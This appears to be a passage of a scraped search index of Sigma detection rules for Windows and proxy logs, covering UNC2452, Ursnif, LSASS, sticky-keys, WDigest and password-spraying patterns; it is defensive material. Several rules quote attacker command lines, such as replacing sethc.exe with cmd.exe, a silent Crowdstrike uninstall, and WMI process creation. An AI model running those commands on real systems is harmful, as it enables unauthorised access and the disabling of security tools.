https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1047/T1047.md#atomic-test-7---create-a-process-using-wmi-query-and-an-encoded-command tags: - attack.execution - attack.t1059.001 - attack.t1047 # - sunburst author: Florian Roth date: 2021/01/20 modified: 2021/01/22 logsource: category: process_creation product: windows detection: selection1: CommandLine|contains|all: - \u0026#39;Invoke-WMIMethod win32_process -name create -argumentlist\u0026#39; - \u0026#39;rundll32 c:\\windows\u0026#39; selection2: CommandLine|contains|all: - \u0026#39;wmic /node:\u0026#39; - \u0026#39;process call create \u0026#34;rundll32 c:\\windows\u0026#39; condition: selection1 or selection2 falsepositives: - Unknown, unlikely, but possible level: critical ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_apt_unc2452_ps.yml/","tags":["attack.execution","attack.t1059.001","attack.t1047"],"title":"UNC2452 PowerShell Pattern"},{"categories":null,"contents":"Detects a specific process creation patterns as seen used by UNC2452 and provided by Microsoft as Microsoft Defender ATP queries\nKnown false-positives Unknown References https://www.microsoft.com/security/blog/2021/01/20/deep-dive-into-the-solorigate-second-stage-activation-from-sunburst-to-teardrop-and-raindrop/ Raw rule (edit) title: UNC2452 Process Creation Patterns id: 9be34ad0-b6a7-4fbd-91cf-fc7ec1047f5f description: Detects a specific process creation patterns as seen used by UNC2452 and provided by Microsoft as Microsoft Defender ATP queries status: experimental references: - https://www.microsoft.com/security/blog/2021/01/20/deep-dive-into-the-solorigate-second-stage-activation-from-sunburst-to-teardrop-and-raindrop/ tags: - attack.execution - attack.t1059.001 # - sunburst # - unc2452 author: Florian Roth date: 2021/01/22 modified: 2021/06/27 logsource: category: process_creation product: windows detection: selection1: CommandLine|contains: - \u0026#39;7z.exe a -v500m -mx9 -r0 -p\u0026#39; selection2: ParentCommandLine|contains|all: - \u0026#39;wscript.exe\u0026#39; - \u0026#39;.vbs\u0026#39; CommandLine|contains|all: - \u0026#39;rundll32.exe\u0026#39; - \u0026#39;C:\\Windows\u0026#39; - \u0026#39;.dll,Tk_\u0026#39; selection3: ParentImage|endswith: \u0026#39;\\rundll32.exe\u0026#39; ParentCommandLine|contains: \u0026#39;C:\\Windows\u0026#39; CommandLine|contains: \u0026#39;cmd.exe /C \u0026#39; selection4: CommandLine|contains|all: - \u0026#39;rundll32 c:\\windows\\\u0026#39; - \u0026#39;.dll \u0026#39; specific1: ParentImage|endswith: \u0026#39;\\rundll32.exe\u0026#39; Image|endswith: \u0026#39;\\dllhost.exe\u0026#39; filter1: CommandLine: - \u0026#39; \u0026#39; - \u0026#39;\u0026#39; condition: selection1 or selection2 or selection3 or selection4 or ( specific1 and not filter1 ) falsepositives: - Unknown level: critical ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_apt_unc2452_cmds.yml/","tags":["attack.execution","attack.t1059.001"],"title":"UNC2452 Process Creation Patterns"},{"categories":null,"contents":"A sigma rule detecting an unidetefied attacker who used phishing emails to target high profile orgs on November 2018. The Actor shares some TTPs with YYTRIUM/APT29 campaign in 2016.\nReferences https://twitter.com/DrunkBinary/status/1063075530180886529 Raw rule (edit) title: Unidentified Attacker November 2018 id: 7453575c-a747-40b9-839b-125a0aae324b status: stable description: A sigma rule detecting an unidetefied attacker who used phishing emails to target high profile orgs on November 2018. The Actor shares some TTPs with YYTRIUM/APT29 campaign in 2016. references: - https://twitter.com/DrunkBinary/status/1063075530180886529 author: \u0026#39;@41thexplorer, Microsoft Defender ATP\u0026#39; date: 2018/11/20 modified: 2021/09/19 tags: - attack.execution - attack.t1218.011 logsource: category: process_creation product: windows detection: selection: CommandLine|contains: \u0026#39;cyzfc.dat,\u0026#39; CommandLine|endswith: \u0026#39;PointFunctionCall\u0026#39; condition: selection level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_apt_unidentified_nov_18.yml/","tags":["attack.execution","attack.t1218.011"],"title":"Unidentified Attacker November 2018"},{"categories":null,"contents":"Adversaries may disable security tools to avoid possible detection of their tools and activities by uninstalling Crowdstrike Falcon\nKnown false-positives Uninstall by admin References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.001/T1562.001.md Raw rule (edit) title: Uninstall Crowdstrike Falcon id: f0f7be61-9cf5-43be-9836-99d6ef448a18 status: experimental author: frack113 date: 2021/07/12 description: Adversaries may disable security tools to avoid possible detection of their tools and activities by uninstalling Crowdstrike Falcon references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.001/T1562.001.md tags: - attack.defense_evasion - attack.t1562.001 logsource: category: process_creation product: windows detection: selection: CommandLine|contains|all: - \u0026#39;\\WindowsSensor.exe\u0026#39; - \u0026#39; /uninstall\u0026#39; - \u0026#39; /quiet\u0026#39; condition: selection fields: - ComputerName - User - CommandLine - ParentCommandLine falsepositives: - Uninstall by admin level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_uninstall_crowdstrike_falcon.yml/","tags":["attack.defense_evasion","attack.t1562.001"],"title":"Uninstall Crowdstrike Falcon"},{"categories":null,"contents":"Loading unsigned image (DLL, EXE) into LSASS process\nKnown false-positives Valid user connecting using RDP References https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment Raw rule (edit) title: Unsigned Image Loaded Into LSASS Process id: 857c8db3-c89b-42fb-882b-f681c7cf4da2 status: test description: Loading unsigned image (DLL, EXE) into LSASS process author: Teymur Kheirkhabarov, oscd.community references: - https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment date: 2019/10/22 modified: 2021/11/27 logsource: category: image_load product: windows detection: selection: Image|endswith: \u0026#39;\\lsass.exe\u0026#39; Signed: \u0026#39;false\u0026#39; condition: selection falsepositives: - Valid user connecting using RDP level: medium tags: - attack.credential_access - attack.t1003.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/image_load/image_load_unsigned_image_loaded_into_lsass.yml/","tags":["attack.credential_access","attack.t1003.001"],"title":"Unsigned Image Loaded Into LSASS Process"},{"categories":null,"contents":"Detects Ursnif C2 traffic.\nKnown false-positives Unknown References https://www.fortinet.com/blog/threat-research/ursnif-variant-spreading-word-document.html Raw rule (edit) title: Ursnif Malware C2 URL Pattern id: 932ac737-33ca-4afd-9869-0d48b391fcc9 status: stable description: Detects Ursnif C2 traffic. references: - https://www.fortinet.com/blog/threat-research/ursnif-variant-spreading-word-document.html author: Thomas Patzke date: 2019/12/19 modified: 2021/08/09 logsource: category: proxy detection: b64encoding: c-uri|contains: - \u0026#39;_2f\u0026#39; - \u0026#39;_2b\u0026#39; urlpatterns: c-uri|contains|all: - \u0026#39;.avi\u0026#39; - \u0026#39;/images/\u0026#39; condition: b64encoding and urlpatterns fields: - c-ip - c-uri - sc-bytes - c-ua falsepositives: - Unknown level: critical tags: - attack.initial_access - attack.t1566.001 - attack.execution - attack.t1204.002 - attack.command_and_control - attack.t1071.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/proxy/proxy_ursnif_malware_c2_url.yml/","tags":["attack.initial_access","attack.t1566.001","attack.execution","attack.t1204.002","attack.command_and_control","attack.t1071.001"],"title":"Ursnif Malware C2 URL Pattern"},{"categories":null,"contents":"Detects download of Ursnif malware done by dropper documents.\nKnown false-positives Unknown Raw rule (edit) title: Ursnif Malware Download URL Pattern id: a36ce77e-30db-4ea0-8795-644d7af5dfb4 status: stable description: Detects download of Ursnif malware done by dropper documents. author: Thomas Patzke date: 2019/12/19 modified: 2021/08/09 logsource: category: proxy detection: selection: c-uri|contains|all: - \u0026#39;/\u0026#39; - \u0026#39;.php?l=\u0026#39; c-uri|endswith: \u0026#39;.cab\u0026#39; sc-status: 200 condition: selection fields: - c-ip - c-uri - sc-bytes - c-ua falsepositives: - Unknown level: critical ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/proxy/proxy_ursnif_malware_download_url.yml/","tags":null,"title":"Ursnif Malware Download URL Pattern"},{"categories":null,"contents":"Detects plugged USB devices\nKnown false-positives Legitimate administrative activity References https://df-stream.com/2014/01/the-windows-7-event-log-and-usb-device/ https://www.techrepublic.com/article/how-to-track-down-usb-flash-drive-usage-in-windows-10s-event-viewer/ Raw rule (edit) title: USB Device Plugged id: 1a4bd6e3-4c6e-405d-a9a3-53a116e341d4 status: test description: Detects plugged USB devices author: Florian Roth references: - https://df-stream.com/2014/01/the-windows-7-event-log-and-usb-device/ - https://www.techrepublic.com/article/how-to-track-down-usb-flash-drive-usage-in-windows-10s-event-viewer/ date: 2017/11/09 modified: 2021/11/30 logsource: product: windows service: driver-framework definition: mapping Provider_Name \u0026#39;Microsoft-Windows-DriverFrameworks-UserMode/Operational\u0026#39; detection: selection: EventID: - 2003 # Loading drivers - 2100 # Pnp or power management - 2102 # Pnp or power management condition: selection falsepositives: - Legitimate administrative activity level: low tags: - attack.initial_access - attack.t1200 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/driverframeworks/win_usb_device_plugged.yml/","tags":["attack.initial_access","attack.t1200"],"title":"USB Device Plugged"},{"categories":null,"contents":"Application Virtualization Utility is included with Microsoft Office. We are able to abuse \u0026ldquo;AppVLP\u0026rdquo; to execute shell commands. Normally, this binary is used for Application Virtualization, but we can use it as an abuse binary to circumvent the ASR file path rule folder or to mark a file as a system file.\nKnown false-positives unknown Raw rule (edit) title: Using AppVLP To Circumvent ASR File Path Rule id: 9c7e131a-0f2c-4ae0-9d43-b04f4e266d43 status: experimental description: | Application Virtualization Utility is included with Microsoft Office. We are able to abuse \u0026#34;AppVLP\u0026#34; to execute shell commands. Normally, this binary is used for Application Virtualization, but we can use it as an abuse binary to circumvent the ASR file path rule folder or to mark a file as a system file. author: Sreeman date: 2020/03/13 modified: 2022/03/08 logsource: product: windows service: security detection: selection_1: CommandLine|contains: \u0026#39;appvlp.exe\u0026#39; selection_2: CommandLine|contains: - \u0026#39;cmd.exe\u0026#39; - \u0026#39;powershell.exe\u0026#39; selection_3: CommandLine|contains: - \u0026#39;.sh\u0026#39; - \u0026#39;.exe\u0026#39; - \u0026#39;.dll\u0026#39; - \u0026#39;.bin\u0026#39; - \u0026#39;.bat\u0026#39; - \u0026#39;.cmd\u0026#39; - \u0026#39;.js\u0026#39; - \u0026#39;.msh\u0026#39; - \u0026#39;.reg\u0026#39; - \u0026#39;.scr\u0026#39; - \u0026#39;.ps\u0026#39; - \u0026#39;.vb\u0026#39; - \u0026#39;.jar\u0026#39; - \u0026#39;.pl\u0026#39; - \u0026#39;.inf\u0026#39; condition: all of selection_* falsepositives: - unknown fields: - ParentProcess - CommandLine - ParentCommandLine level: medium tags: - attack.t1218 - attack.defense_evasion - attack.execution ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/security/win_asr_bypass_via_appvlp_re.yml/","tags":["attack.t1218","attack.defense_evasion","attack.execution"],"title":"Using AppVLP To Circumvent ASR File Path Rule"},{"categories":null,"contents":"Detects using SettingSyncHost.exe to run hijacked binary\nKnown false-positives unknown References https://www.hexacorn.com/blog/2020/02/02/settingsynchost-exe-as-a-lolbin Raw rule (edit) title: Using SettingSyncHost.exe as LOLBin id: b2ddd389-f676-4ac4-845a-e00781a48e5f status: test description: Detects using SettingSyncHost.exe to run hijacked binary author: Anton Kutepov, oscd.community references: - https://www.hexacorn.com/blog/2020/02/02/settingsynchost-exe-as-a-lolbin date: 2020/02/05 modified: 2021/11/27 logsource: category: process_creation product: windows detection: system_utility: Image|startswith: - \u0026#39;C:\\Windows\\System32\\\u0026#39; - \u0026#39;C:\\Windows\\SysWOW64\\\u0026#39; parent_is_settingsynchost: ParentCommandLine|contains|all: - \u0026#39;cmd.exe /c\u0026#39; - \u0026#39;RoamDiag.cmd\u0026#39; - \u0026#39;-outputpath\u0026#39; condition: not system_utility and parent_is_settingsynchost fields: - TargetFilename - Image falsepositives: - unknown level: high tags: - attack.execution - attack.defense_evasion - attack.t1574.008 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_using_settingsynchost_as_lolbin.yml/","tags":["attack.execution","attack.defense_evasion","attack.t1574.008"],"title":"Using SettingSyncHost.exe as LOLBin"},{"categories":null,"contents":"By replacing the sticky keys executable with the local admins CMD executable, an attacker is able to access a privileged windows console session without authenticating to the system. When the sticky keys are \u0026ldquo;activated\u0026rdquo; the privilleged shell is launched.\nKnown false-positives Unknown References https://www.fireeye.com/blog/threat-research/2017/03/apt29_domain_frontin.html https://www.clearskysec.com/wp-content/uploads/2020/02/ClearSky-Fox-Kitten-Campaign-v1.pdf Raw rule (edit) title: Using Sticky-keys To Obtain Unauthenticated, Privileged Console Access id: 1070db9a-3e5d-412e-8e7b-7183b616e1b3 description: By replacing the sticky keys executable with the local admins CMD executable, an attacker is able to access a privileged windows console session without authenticating to the system. When the sticky keys are \u0026#34;activated\u0026#34; the privilleged shell is launched. references: - https://www.fireeye.com/blog/threat-research/2017/03/apt29_domain_frontin.html - https://www.clearskysec.com/wp-content/uploads/2020/02/ClearSky-Fox-Kitten-Campaign-v1.pdf status: experimental date: 2020/02/18 modified: 2022/01/11 author: Sreeman tags: - attack.t1546.008 - attack.privilege_escalation logsource: product: windows category: process_creation detection: selection: CommandLine: \u0026#39;copy /y C:\\windows\\system32\\cmd.exe C:\\windows\\system32\\sethc.exe\u0026#39; condition: selection fields: - CommandLine - ParentProcess falsepositives: - Unknown level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_sticky_keys_unauthenticated_privileged_cmd_access.yml/","tags":["attack.t1546.008","attack.privilege_escalation"],"title":"Using Sticky-keys To Obtain Unauthenticated, Privileged Console Access"},{"categories":null,"contents":"Detects multiple failed logins with multiple valid domain accounts from a single source system using the Kerberos protocol.\nKnown false-positives Vulnerability scanners Misconfigured systems Remote administration tools VPN terminators Multiuser systems like Citrix server farms References https://docs.splunk.com/Documentation/ESSOC/3.22.0/stories/UseCase#Active_directory_password_spraying Raw rule (edit) title: Valid Users Failing to Authenticate From Single Source Using Kerberos id: 5d1d946e-32e6-4d9a-a0dc-0ac022c7eb98 description: Detects multiple failed logins with multiple valid domain accounts from a single source system using the Kerberos protocol. status: experimental author: Mauricio Velazco, frack113 date: 2021/06/01 modified: 2021/07/06 references: - https://docs.splunk.com/Documentation/ESSOC/3.22.0/stories/UseCase#Active_directory_password_spraying tags: - attack.t1110.003 - attack.initial_access - attack.privilege_escalation logsource: product: windows service: security detection: selection: EventID: 4771 Status: \u0026#39;0x18\u0026#39; filter_computer: TargetUserName|endswith: \u0026#39;$\u0026#39; timeframe: 24h condition: - selection and not filter_computer | count(TargetUserName) by IpAddress \u0026gt; 10 falsepositives: - Vulnerability scanners - Misconfigured systems - Remote administration tools - VPN terminators - Multiuser systems like Citrix server farms level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/security/win_susp_failed_logons_single_source_kerberos.yml/","tags":["attack.t1110.003","attack.initial_access","attack.privilege_escalation"],"title":"Valid Users Failing to Authenticate From Single Source Using Kerberos"},{"categories":null,"contents":"Detects failed logins with multiple valid domain accounts from a single source system using the NTLM protocol.\nKnown false-positives Terminal servers Jump servers Other multiuser systems like Citrix server farms Workstations with frequently changing users References https://docs.splunk.com/Documentation/ESSOC/3.22.0/stories/UseCase#Active_directory_password_spraying Raw rule (edit) title: Valid Users Failing to Authenticate from Single Source Using NTLM id: f88bab7f-b1f4-41bb-bdb1-4b8af35b0470 description: Detects failed logins with multiple valid domain accounts from a single source system using the NTLM protocol. status: experimental author: Mauricio Velazco date: 2021/06/01 modified: 2021/07/07 references: - https://docs.splunk.com/Documentation/ESSOC/3.22.0/stories/UseCase#Active_directory_password_spraying tags: - attack.t1110.003 - attack.initial_access - attack.privilege_escalation logsource: product: windows service: security detection: selection1: EventID: 4776 Status: \u0026#39;*0xC000006A\u0026#39; #Account logon with misspelled or bad password. filter: TargetUserName: \u0026#39;*$\u0026#39; timeframe: 24h condition: - selection1 and not filter | count(TargetUserName) by Workstation \u0026gt; 10 falsepositives: - Terminal servers - Jump servers - Other multiuser systems like Citrix server farms - Workstations with frequently changing users level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/security/win_susp_failed_logons_single_source_ntlm.yml/","tags":["attack.t1110.003","attack.initial_access","attack.privilege_escalation"],"title":"Valid Users Failing to Authenticate from Single Source Using NTLM"},{"categories":null,"contents":"Detects VBScript content stored into registry keys as seen being used by UNC2452 group\nKnown false-positives Unknown References https://www.microsoft.com/security/blog/2021/03/04/goldmax-goldfinder-sibot-analyzing-nobelium-malware/ Raw rule (edit) title: VBScript Payload Stored in Registry id: 46490193-1b22-4c29-bdd6-5bf63907216f description: Detects VBScript content stored into registry keys as seen being used by UNC2452 group status: experimental date: 2021/03/05 modified: 2022/03/04 author: Florian Roth references: - https://www.microsoft.com/security/blog/2021/03/04/goldmax-goldfinder-sibot-analyzing-nobelium-malware/ logsource: category: registry_event product: windows detection: selection: EventType: SetValue TargetObject|contains: \u0026#39;Software\\Microsoft\\Windows\\CurrentVersion\u0026#39; Details|contains: - \u0026#39;vbscript\u0026#39; - \u0026#39;jscript\u0026#39; - \u0026#39;mshtml\u0026#39; - \u0026#39;RunHTMLApplication\u0026#39; - \u0026#39;Execute(\u0026#39; - \u0026#39;CreateObject\u0026#39; - \u0026#39;RegRead\u0026#39; - \u0026#39;window.close\u0026#39; filter: TargetObject|contains: \u0026#39;Software\\Microsoft\\Windows\\CurrentVersion\\Run\u0026#39; filter_dotnet: Image|endswith: \u0026#39;\\msiexec.exe\u0026#39; TargetObject|contains: \u0026#39;\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Installer\\UserData\\\u0026#39; Details|contains: - \u0026#39;\\Microsoft.NET\\Primary Interop Assemblies\\Microsoft.mshtml.dll\u0026#39; - \u0026#39;\u0026lt;\\Microsoft.mshtml,fileVersion=\u0026#39; - \u0026#39;FL_Microsoft_mshtml_dll_____X86.\u0026#39; - \u0026#39;Microsoft_mshtml_dll_1_____X86.\u0026#39; - \u0026#39;\u0026lt;\\Microsoft.mshtml,culture=\u0026#39; condition: selection and not 1 of filter* falsepositives: - Unknown level: high tags: - attack.persistence - attack.t1547.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/registry_event/registry_event_vbs_payload_stored.yml/","tags":["attack.persistence","attack.t1547.001"],"title":"VBScript Payload Stored in Registry"},{"categories":null,"contents":"Detects when verclsid.exe is used to run COM object via GUID\nKnown false-positives Unknown References https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Verclsid.yml https://gist.github.com/NickTyrer/0598b60112eaafe6d07789f7964290d5 https://bohops.com/2018/08/18/abusing-the-com-registry-structure-part-2-loading-techniques-for-evasion-and-persistence/ Raw rule (edit) title: Verclsid.exe Runs COM Object id: d06be4b9-8045-428b-a567-740a26d9db25 status: test description: Detects when verclsid.exe is used to run COM object via GUID author: Victor Sergeev, oscd.community references: - https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Verclsid.yml - https://gist.github.com/NickTyrer/0598b60112eaafe6d07789f7964290d5 - https://bohops.com/2018/08/18/abusing-the-com-registry-structure-part-2-loading-techniques-for-evasion-and-persistence/ date: 2020/10/09 modified: 2021/11/27 logsource: category: process_creation product: windows detection: image_path: Image|endswith: \u0026#39;\\verclsid.exe\u0026#39; cmd_s: CommandLine|contains: \u0026#39;/S\u0026#39; cmd_c: CommandLine|contains: \u0026#39;/C\u0026#39; condition: image_path and cmd_c and cmd_s fields: - CommandLine falsepositives: - Unknown level: medium tags: - attack.defense_evasion - attack.t1218 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_verclsid_runs_com.yml/","tags":["attack.defense_evasion","attack.t1218"],"title":"Verclsid.exe Runs COM Object"},{"categories":null,"contents":"Detects successful code compilation via Visual Basic Command Line Compiler that utilizes Windows Resource to Object Converter.\nKnown false-positives Utilization of this tool should not be seen in enterprise environment References https://lolbas-project.github.io/lolbas/Binaries/Vbc/ Raw rule (edit) title: Visual Basic Command Line Compiler Usage id: 7b10f171-7f04-47c7-9fa2-5be43c76e535 status: test description: Detects successful code compilation via Visual Basic Command Line Compiler that utilizes Windows Resource to Object Converter. author: \u0026#39;Ensar Şamil, @sblmsrsn, @oscd_initiative\u0026#39; references: - https://lolbas-project.github.io/lolbas/Binaries/Vbc/ date: 2020/10/07 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: ParentImage|endswith: \u0026#39;\\vbc.exe\u0026#39; Image|endswith: \u0026#39;\\cvtres.exe\u0026#39; condition: selection falsepositives: - Utilization of this tool should not be seen in enterprise environment level: high tags: - attack.defense_evasion - attack.t1027.004 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_visual_basic_compiler.yml/","tags":["attack.defense_evasion","attack.t1027.004"],"title":"Visual Basic Command Line Compiler Usage"},{"categories":null,"contents":"Detects suspicious child process creations of VMware Tools process which may indicate persistence setup\nKnown false-positives Legitimate use by adminstrator References https://bohops.com/2021/10/08/analyzing-and-detecting-a-vmtools-persistence-technique/ Raw rule (edit) title: VMToolsd Suspicious Child Process id: 5687f942-867b-4578-ade7-1e341c46e99a status: experimental description: Detects suspicious child process creations of VMware Tools process which may indicate persistence setup tags: - attack.execution - attack.persistence - attack.t1059 author: behops, Bhabesh Raj date: 2021/10/08 modified: 2021/10/10 references: - https://bohops.com/2021/10/08/analyzing-and-detecting-a-vmtools-persistence-technique/ fields: - CommandLine - ParentCommandLine - Details falsepositives: - Legitimate use by adminstrator level: high logsource: category: process_creation product: windows detection: selection: ParentImage|endswith: \u0026#39;\\vmtoolsd.exe\u0026#39; Image|endswith: - \u0026#39;\\cmd.exe\u0026#39; - \u0026#39;\\powershell.exe\u0026#39; - \u0026#39;\\rundll32.exe\u0026#39; - \u0026#39;\\regsvr32.exe\u0026#39; - \u0026#39;\\wscript.exe\u0026#39; - \u0026#39;\\cscript.exe\u0026#39; filter: CommandLine|contains: - \u0026#39;\\VMware\\VMware Tools\\poweron-vm-default.bat\u0026#39; - \u0026#39;\\VMware\\VMware Tools\\poweroff-vm-default.bat\u0026#39; - \u0026#39;\\VMware\\VMware Tools\\resume-vm-default.bat\u0026#39; - \u0026#39;\\VMware\\VMware Tools\\suspend-vm-default.bat\u0026#39; condition: selection and not filter ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_vmtoolsd_susp_child_process.yml/","tags":["attack.execution","attack.persistence","attack.t1059"],"title":"VMToolsd Suspicious Child Process"},{"categories":null,"contents":"Detects volume shadow copy mount\nKnown false-positives Legitimate use of volume shadow copy mounts (backups maybe). References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.002/T1003.002.md#atomic-test-3---esentutlexe-sam-copy Raw rule (edit) title: Volume Shadow Copy Mount id: f512acbf-e662-4903-843e-97ce4652b740 description: Detects volume shadow copy mount status: experimental date: 2020/10/20 modified: 2021/10/13 author: Roberto Rodriguez @Cyb3rWard0g, Open Threat Research (OTR) tags: - attack.credential_access - attack.t1003.002 references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.002/T1003.002.md#atomic-test-3---esentutlexe-sam-copy logsource: product: windows service: system detection: selection: Provider_Name: Microsoft-Windows-Ntfs EventID: 98 DeviceName|contains: HarddiskVolumeShadowCopy condition: selection falsepositives: - Legitimate use of volume shadow copy mounts (backups maybe). level: low ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/system/win_volume_shadow_copy_mount.yml/","tags":["attack.credential_access","attack.t1003.002"],"title":"Volume Shadow Copy Mount"},{"categories":null,"contents":"Detects the registration of the security event source VSSAudit. It would usually trigger when volume shadow copy operations happen.\nKnown false-positives Legitimate use of VSSVC. Maybe backup operations. It would usually be done by C:\\Windows\\System32\\VSSVC.exe. References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.002/T1003.002.md#atomic-test-3---esentutlexe-sam-copy Raw rule (edit) title: VSSAudit Security Event Source Registration id: e9faba72-4974-4ab2-a4c5-46e25ad59e9b description: Detects the registration of the security event source VSSAudit. It would usually trigger when volume shadow copy operations happen. status: experimental date: 2020/10/20 modified: 2021/11/30 author: Roberto Rodriguez @Cyb3rWard0g, Open Threat Research (OTR) tags: - attack.credential_access - attack.t1003.002 references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.002/T1003.002.md#atomic-test-3---esentutlexe-sam-copy logsource: product: windows service: security detection: selection: Provider_Name: Microsoft-Windows-Security-Auditing AuditSourceName: VSSAudit EventID: - 4904 - 4905 condition: selection falsepositives: - Legitimate use of VSSVC. Maybe backup operations. It would usually be done by C:\\Windows\\System32\\VSSVC.exe. level: low ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/security/win_vssaudit_secevent_source_registration.yml/","tags":["attack.credential_access","attack.t1003.002"],"title":"VSSAudit Security Event Source Registration"},{"categories":null,"contents":"Detects the load of the vulnerable Dell BIOS update driver as reported in CVE-2021-21551\nKnown false-positives legitimate BIOS driver updates (should be rare) References https://labs.sentinelone.com/cve-2021-21551-hundreds-of-millions-of-dell-computers-at-risk-due-to-multiple-bios-driver-privilege-escalation-flaws/ Raw rule (edit) title: Vulnerable Dell BIOS Update Driver Load id: 21b23707-60d6-41bb-96e3-0f0481b0fed9 description: Detects the load of the vulnerable Dell BIOS update driver as reported in CVE-2021-21551 status: experimental author: Florian Roth date: 2021/05/05 references: - https://labs.sentinelone.com/cve-2021-21551-hundreds-of-millions-of-dell-computers-at-risk-due-to-multiple-bios-driver-privilege-escalation-flaws/ logsource: category: driver_load product: windows tags: - attack.privilege_escalation - cve.2021.21551 - attack.t1543 detection: selection_image: ImageLoaded|contains: \u0026#39;\\DBUtil_2_3.Sys\u0026#39; selection_hash: Hashes|contains: - \u0026#39;0296e2ce999e67c76352613a718e11516fe1b0efc3ffdb8918fc999dd76a73a5\u0026#39; - \u0026#39;c948ae14761095e4d76b55d9de86412258be7afd\u0026#39; - \u0026#39;c996d7971c49252c582171d9380360f2\u0026#39; - \u0026#39;ddbf5ecca5c8086afde1fb4f551e9e6400e94f4428fe7fb5559da5cffa654cc1\u0026#39; - \u0026#39;10b30bdee43b3a2ec4aa63375577ade650269d25\u0026#39; - \u0026#39;d2fd132ab7bbc6bbb87a84f026fa0244\u0026#39; condition: selection_image or selection_hash falsepositives: - legitimate BIOS driver updates (should be rare) level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/driver_load/driver_load_vuln_dell_driver.yml/","tags":["attack.privilege_escalation","cve.2021.21551","attack.t1543"],"title":"Vulnerable Dell BIOS Update Driver Load"},{"categories":null,"contents":"Detects potential malicious modification of the property value of IsCredGuardEnabled from HKLM:\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest to disable Cred Guard on a system. This is usually used with UseLogonCredential to manipulate the caching credentials.\nKnown false-positives Unknown References https://teamhydra.blog/2020/08/25/bypassing-credential-guard/ Raw rule (edit) title: Wdigest CredGuard Registry Modification id: 1a2d6c47-75b0-45bd-b133-2c0be75349fd status: test description: Detects potential malicious modification of the property value of IsCredGuardEnabled from HKLM:\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest to disable Cred Guard on a system. This is usually used with UseLogonCredential to manipulate the caching credentials. author: Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research) references: - https://teamhydra.blog/2020/08/25/bypassing-credential-guard/ date: 2019/08/25 modified: 2021/11/27 logsource: category: registry_event product: windows detection: selection: TargetObject|endswith: \u0026#39;\\IsCredGuardEnabled\u0026#39; condition: selection falsepositives: - Unknown level: critical tags: - attack.defense_evasion - attack.t1112 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/registry_event/registry_event_disable_wdigest_credential_guard.yml/","tags":["attack.defense_evasion","attack.t1112"],"title":"Wdigest CredGuard Registry Modification"},{"categories":null,"contents":"Detects potential malicious modification of the property value of UseLogonCredential from HKLM:\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest to enable clear-text credentials\nKnown false-positives Unknown References https://threathunterplaybook.com/notebooks/windows/02_execution/WIN-190511223310.html https://support.microsoft.com/en-us/topic/microsoft-security-advisory-update-to-improve-credentials-protection-and-management-may-13-2014-93434251-04ac-b7f3-52aa-9f951c14b649 Raw rule (edit) title: Wdigest Enable UseLogonCredential id: d6a9b252-c666-4de6-8806-5561bbbd3bdc description: Detects potential malicious modification of the property value of UseLogonCredential from HKLM:\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest to enable clear-text credentials status: experimental date: 2019/09/12 modified: 2022/02/01 author: Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research) tags: - attack.defense_evasion - attack.t1112 references: - https://threathunterplaybook.com/notebooks/windows/02_execution/WIN-190511223310.html - https://support.microsoft.com/en-us/topic/microsoft-security-advisory-update-to-improve-credentials-protection-and-management-may-13-2014-93434251-04ac-b7f3-52aa-9f951c14b649 logsource: category: registry_event product: windows detection: selection: EventType: SetValue TargetObject|endswith: \u0026#39;WDigest\\UseLogonCredential\u0026#39; Details: DWORD (0x00000001) condition: selection falsepositives: - Unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/registry_event/registry_event_wdigest_enable_uselogoncredential.yml/","tags":["attack.defense_evasion","attack.t1112"],"title":"Wdigest Enable UseLogonCredential"},{"categories":null,"contents":"Detects scenario where weak encryption is enabled for a user profile which could be used for hash/password cracking.\nKnown false-positives Unknown References https://adsecurity.org/?p=2053 